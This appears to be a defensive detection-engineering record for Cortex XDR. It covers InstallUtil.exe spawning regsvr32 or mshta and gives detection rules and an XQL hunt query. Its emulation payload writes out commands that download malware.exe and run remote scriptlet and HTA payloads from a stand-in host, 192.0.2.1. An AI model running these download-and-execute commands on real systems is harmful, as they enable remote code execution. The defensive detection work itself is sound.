identity.description: An attacker uses InstallUtil.exe to execute malicious code via a .NET assembly, spawning unusual lolbins like regsvr32.exe or mshta.exe to bypass defenses. Cortex should detect the anomalous process chain from InstallUtil.exe to these lolbins.

payload.code:
cd C:\Windows\Temp
wget http://192.0.2.1/malware.exe -OutFile malware.exe
stub malware.exe
regsvr32.exe /s /n /u /i:http://192.0.2.1/payload.sct scrobj.dll
mshta.exe http://192.0.2.1/launcher.hta

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Unusual Lolbins Process Spawned by InstallUtil.exe
biocs.description: Detects when InstallUtil.exe spawns uncommon lolbins like regsvr32 or mshta
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'InstallUtil.exe'
| filter action_process_image_name in ('regsvr32.exe', 'mshta.exe')
| filter action_file_path not contains 'Windows\\System32'

abiocs.name: Lolbin Process Chain from InstallUtil
abiocs.description: Detects anomalous execution chain starting from InstallUtil.exe to uncommon lolbins
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'InstallUtil.exe'
| filter action_process_image_name in ('regsvr32.exe', 'mshta.exe')
| filter causality_actor_process_image_name = 'InstallUtil.exe'

xql_queries.name: InstallUtil Spawned Lolbins Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'InstallUtil.exe'
| filter action_process_image_name in ('regsvr32.exe', 'mshta.exe')
| fields agent_hostname, actor_process_image_name, action_process_image_name, action_file_path
